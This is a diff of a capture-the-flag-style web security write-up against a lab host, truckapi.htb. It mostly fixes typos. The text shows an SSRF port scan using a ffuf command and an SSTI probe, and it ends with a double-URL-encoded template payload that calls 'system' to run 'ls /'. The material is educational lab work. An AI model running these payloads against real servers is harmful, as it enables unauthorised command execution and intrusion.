@@ -4,7 +4,7 @@ Flavor Fusion Express has hired us to perform a security assessment of their new
 
 So we need to evaluate the sites for exploits against:
 
--	Backend infrastructure
+- Backend infrastructure
 - Website configuration
 - Server logic
 
@@ -12,7 +12,7 @@ So we need to evaluate the sites for exploits against:
 
 # Recon:
 
-If we go to the website, we'll find that theres some info about the business, such as three locations, a customer comment, as well as a few buttons that don't go anywhere.
+If we go to the website, we'll find that there's some info about the business, such as three locations, a customer comment, as well as a few buttons that don't go anywhere.
 
 However if we open devtools, well find an API:
 
@@ -39,8 +39,6 @@ If we send the request, we'll get the key values pairs back:
 
 # Attack:
 
-Let's see what happens when we modify whats given to the API.
-
 Lets see if a Server Side Request Forgery (SSRF) will allow us to discover any unexposed services.
 
 First, send a request to an unlikly port:
@@ -59,19 +57,18 @@ Now we can enumerate the services:
 
 	ffuf --request req.txt -request-proto http -w ports.txt -mc all -fr 'Error \(7\)'
 
-- After the scan, we've found port 80, and 3306, which is typically a mysql port. This is likly where our client is storing their sensitive data.
+- After the scan, we've found port 80, and 3306, which is typically a mysql port. This is likely where our client is storing their sensitive data.
 
 
 So we've been able to use SSRF to learn gain additional info about our target.
 
-Now lets go back to the the proxy and send a standard
 
-Since the  lets try a Server-Side Template Injection (SSTI).
+Because the website uses an api to get info that is later added to the webpage, lets go back to the the proxy and try for Server-Side Template Injection (SSTI).
 
 	api=http://truckapi.htb/?id%3D{{7*7}}
 
 
-- The responce is:
+- The response is:
 
 		{"id": "49", "location": "134 Main Street"}
 
@@ -102,7 +99,7 @@ Now lets find the flag:
 
 	api=http://truckapi.htb/?id%3D%7B%7B%5B%27ls%2520%2F%27%5D%7Cfilter%28%27system%27%29%7D%7D
 
-- Note: the target is very particular with its encoding, so make sure to double url enncode any spaces
+- Note: the target is very particular with its encoding, so make sure to double url encode any spaces
 
 	- Ex: ['ls /'] --> ['ls%20/'] --> %5B%27ls%2520%2F%27%5D
 
